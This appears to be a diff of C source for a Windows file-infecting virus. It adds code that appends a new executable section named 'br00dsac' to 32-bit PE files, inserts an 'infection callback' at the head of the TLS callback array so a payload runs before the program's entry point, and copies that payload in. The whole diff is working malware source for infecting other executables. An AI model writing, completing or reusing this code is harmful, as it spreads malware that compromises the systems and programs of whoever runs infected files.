@@ -367,6 +367,148 @@ void create_tls_relocations(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEA
    cvector_free(iat, &relocations);
 }
 
+CVector create_32bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEADER *new_section)
+{
+   uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
+   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
+   size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
+   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
+   
+   size_t new_section_size = 0;
+
+   /* begin creating the new tls directory */
+   new_section_size += sizeof(IMAGE_TLS_DIRECTORY32);
+
+   PIMAGE_TLS_DIRECTORY32 old_tls_directory = NULL;
+   IMAGE_TLS_DIRECTORY32 new_tls_directory;
+
+   /* if there is already a tls directory, copy it */
+   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0)
+   {
+      old_tls_directory = RECAST(PIMAGE_TLS_DIRECTORY32,byte_module+rva_to_offset(module,
+                                                                                  nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress));
+      iat->memcpy(&new_tls_directory, old_tls_directory, sizeof(IMAGE_TLS_DIRECTORY64));
+   }
+
+   /* create the tls data vector and the callback vector */
+   CVector tls_data = cvector_alloc(iat, sizeof(uint8_t), 1);
+   CVector tls_callbacks = cvector_alloc(iat, sizeof(uint32_t), 0);
+
+   /* if there is an old tls directory and an old set of data, copy it */
+   if (old_tls_directory != NULL && old_tls_directory->StartAddressOfRawData != 0)
+   {
+      cvector_realloc(iat, &tls_data, old_tls_directory->EndAddressOfRawData - old_tls_directory->StartAddressOfRawData);
+      DWORD data_rva = old_tls_directory->StartAddressOfRawData - nt_headers->OptionalHeader.ImageBase;
+      iat->memcpy(tls_data.data, byte_module+rva_to_offset(module, data_rva), tls_data.elements);
+   }
+
+   /* if there are callbacks in the old tls directory, copy them */
+   if (old_tls_directory != NULL && old_tls_directory->AddressOfCallBacks != 0)
+   {
+      DWORD callback_rva = old_tls_directory->AddressOfCallBacks - nt_headers->OptionalHeader.ImageBase;
+      uint32_t *callback_array = RECAST(uint32_t *,byte_module+rva_to_offset(module, callback_rva));
+
+      do
+      {
+         cvector_push(iat, &tls_callbacks, callback_array++);
+
+         if (*callback_array == 0)
+            cvector_push(iat, &tls_callbacks, callback_array);
+      } while (*callback_array != 0);
+   }
+
+   /* align the data on an arbitrary 4-byte boundary, because I am neurotic */
+   size_t aligned_tls_data_size = tls_data.elements;
+   
+   if (aligned_tls_data_size % 4 != 0)
+      aligned_tls_data_size += (4 - aligned_tls_data_size % 4);
+
+   /* establish the pointers for the data in the tls directory */
+   DWORD tls_data_offset = new_section_size;
+   DWORD tls_data_start_rva = new_section->VirtualAddress + tls_data_offset;
+   DWORD tls_data_end_rva = tls_data_start_rva + tls_data.elements;
+   new_section_size += aligned_tls_data_size;
+   new_tls_directory.StartAddressOfRawData = tls_data_start_rva + nt_headers->OptionalHeader.ImageBase;
+   new_tls_directory.EndAddressOfRawData = tls_data_end_rva + nt_headers->OptionalHeader.ImageBase;
+
+   /* create the tls index object */
+   DWORD tls_index_offset = new_section_size;
+   DWORD tls_index_rva = new_section->VirtualAddress + tls_index_offset;
+   new_section_size += sizeof(DWORD);
+   new_tls_directory.AddressOfIndex = tls_index_rva + nt_headers->OptionalHeader.ImageBase;
+
+   /* create our infection callback and insert it at the beginning of the callback array */
+   DWORD tls_callback_offset = new_section_size;
+   DWORD tls_callback_rva = new_section->VirtualAddress + tls_callback_offset;
+   uint32_t placeholder = 0xABAD1DEA;
+   cvector_insert(iat, &tls_callbacks, 0, &placeholder);
+
+   /* null terminate the callback array if it's not already */
+   if (CVECTOR_CAST(&tls_callbacks, uint32_t *)[tls_callbacks.elements-1] != 0)
+   {
+      uintptr_t zero = 0;
+      cvector_push(iat, &tls_callbacks, &zero);
+   }
+
+   /* set the new address of the tls callbacks */
+   new_section_size += CVECTOR_BYTES(&tls_callbacks) + 16; // add 16 bytes padding because it would be weird to have assembly directly after (again, neurotic)
+   new_tls_directory.AddressOfCallBacks = tls_callback_rva + nt_headers->OptionalHeader.ImageBase;
+
+   /* replace our placeholder value with the new va address of our callback and accomodate our payload */
+   DWORD tls_infection_offset = new_section_size;
+   DWORD tls_infection_rva = new_section->VirtualAddress + tls_infection_offset;
+   CVECTOR_CAST(&tls_callbacks, uint32_t *)[0] = tls_infection_rva + nt_headers->OptionalHeader.ImageBase;
+   new_section_size += INFECTION32_SIZE;
+
+   /* set the new section size */
+   new_section->Misc.VirtualSize = RECAST(DWORD, new_section_size);
+   new_section->SizeOfRawData = RECAST(DWORD, new_section_size);
+
+   /* align the section size to the file alignment boundary */
+   if (new_section->SizeOfRawData % nt_headers->OptionalHeader.FileAlignment != 0)
+      new_section->SizeOfRawData += (nt_headers->OptionalHeader.FileAlignment - (new_section->SizeOfRawData % nt_headers->OptionalHeader.FileAlignment));
+
+   /* set the characteristics and name of the section */
+   new_section->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
+   iat->memcpy(new_section->Name, "br00dsac", 8);
+
+   /* set the tls directory pointer in our binary */
+   nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = new_section->VirtualAddress;
+   nt_headers->OptionalHeader.SizeOfImage = 0;
+   DWORD lowest_rva = 0xFFFFFFFF;
+
+   /* determine the offset of the first significant section by calculating the lowest rva
+    * while simultaneously determining the size of the image (this is to appropriately calculate
+    * the header size in memory)
+    */
+   for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i)
+   {
+      nt_headers->OptionalHeader.SizeOfImage += section_table[i].Misc.VirtualSize;
+
+      if (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment != 0)
+         nt_headers->OptionalHeader.SizeOfImage +=
+            nt_headers->OptionalHeader.SectionAlignment - (nt_headers->OptionalHeader.SizeOfImage % nt_headers->OptionalHeader.SectionAlignment);
+
+      if (section_table[i].VirtualAddress < lowest_rva)
+         lowest_rva = section_table[i].VirtualAddress;
+   }
+
+   /* the lowest rva of the sections contains the functional end of the headers */
+   nt_headers->OptionalHeader.SizeOfImage += lowest_rva;
+
+   /* create the new section and copy all the relevant data */
+   CVector new_section_data = cvector_alloc(iat, sizeof(uint8_t), new_section->SizeOfRawData);
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *), &new_tls_directory, sizeof(IMAGE_TLS_DIRECTORY32));
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_data_offset, tls_data.data, CVECTOR_BYTES(&tls_data));
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_callback_offset, tls_callbacks.data, CVECTOR_BYTES(&tls_callbacks));
+   iat->memcpy(CVECTOR_CAST(&new_section_data, uint8_t *)+tls_infection_offset, INFECTION32, INFECTION32_SIZE);
+
+   cvector_free(iat, &tls_data);
+   cvector_free(iat, &tls_callbacks);
+
+   return new_section_data;
+}
+
 CVector create_64bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTION_HEADER *new_section)
 {
    uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
@@ -512,26 +654,48 @@ CVector create_64bit_tls_section(InfectorIAT *iat, CVector *module, IMAGE_SECTIO
 CVector infect_32bit(InfectorIAT *iat, CVector *module)
 {
    uint8_t *byte_module = CVECTOR_CAST(module, uint8_t *);
-   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+CVECTOR_CAST(module, PIMAGE_DOS_HEADER)->e_lfanew);
-
-   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
-   {
-      puts("\t\tExecutable does not have a TLS directory.");
-   }
-   else
-   {
-      puts("\t\tExecutable has a TLS directory.");
-   }
-
-   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0)
-      puts("\t\tExecutable has no relocations.");
-   else
-      puts("\t\tExecutable has relocations.");
-
+   PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew);
    size_t nt_headers_size = sizeof(DWORD)+sizeof(IMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader;
-   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module, PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
+   IMAGE_SECTION_HEADER *section_table = RECAST(PIMAGE_SECTION_HEADER,byte_module+CVECTOR_CAST(module,PIMAGE_DOS_HEADER)->e_lfanew+nt_headers_size);
+   IMAGE_SECTION_HEADER *last_section = &section_table[nt_headers->FileHeader.NumberOfSections-1];
+   IMAGE_SECTION_HEADER *new_section = &section_table[nt_headers->FileHeader.NumberOfSections];
+   CVector result = cvector_alloc(iat, sizeof(uint8_t), 0);
+   DWORD new_section_offset = last_section->PointerToRawData + last_section->SizeOfRawData;
 
-   return cvector_alloc(iat, sizeof(uint8_t), 0);
+   /* align the new section offset to the file alignment boundary */
+   if (new_section_offset % nt_headers->OptionalHeader.FileAlignment != 0)
+      new_section_offset += nt_headers->OptionalHeader.FileAlignment - (new_section_offset % nt_headers->OptionalHeader.FileAlignment);
+
+   if (new_section_offset < module->elements) /* there's appended data to this binary, do not tamper */
+   {
+      puts("\t\tAppended data on binary, cowardly quitting.\n");
+      return result;
+   }
+
+   /* increment the number of sections in the binary */
+   nt_headers->FileHeader.NumberOfSections += 1;
+
+   /* set the target address on the new section */
+   new_section->PointerToRawData = new_section_offset;
+   new_section->VirtualAddress = last_section->VirtualAddress + last_section->SizeOfRawData;
+
+   /* align the new address on the virtual alignment boundary */
+   if (new_section->VirtualAddress % nt_headers->OptionalHeader.SectionAlignment != 0)
+      new_section->VirtualAddress += nt_headers->OptionalHeader.SectionAlignment - (new_section->VirtualAddress % nt_headers->OptionalHeader.SectionAlignment);
+
+   CVector new_section_data = create_32bit_tls_section(iat, module, new_section);
+
+   /* if there's a relocation directory, add new relocations targetting our new tls directory */
+   if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
+      create_tls_relocations(iat, module, new_section, &new_section_data, FALSE);
+
+   result = cvector_alloc(iat, sizeof(uint8_t), module->elements + new_section_data.elements);
+   iat->memcpy(result.data, module->data, module->elements);
+   iat->memcpy(CVECTOR_CAST(&result, uint8_t *)+module->elements, new_section_data.data, new_section_data.elements);
+
+   cvector_free(iat, &new_section_data);
+            
+   return result;
 }
 
 CVector infect_64bit(InfectorIAT *iat, CVector *module)
@@ -731,8 +895,22 @@ int infect(void)
       }
 
       IMAGE_DOS_HEADER *dos_header = CVECTOR_CAST(&exe_buffer,PIMAGE_DOS_HEADER);
+
+      if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
+      {
+         printf("\t%s is not a valid PE file\n", executable);
+         goto free_file;
+      }
+      
       IMAGE_NT_HEADERS *nt_headers = RECAST(PIMAGE_NT_HEADERS,CVECTOR_CAST(&exe_buffer,uint8_t *)+dos_header->e_lfanew);
-      CVector rewritten_image;
+
+      if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
+      {
+         printf("\t%s is not a valid PE file\n", executable);
+         goto free_file;
+      }
+      
+      CVector rewritten_image = cvector_alloc(iat, sizeof(uint8_t), 0);
 
       if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
       {
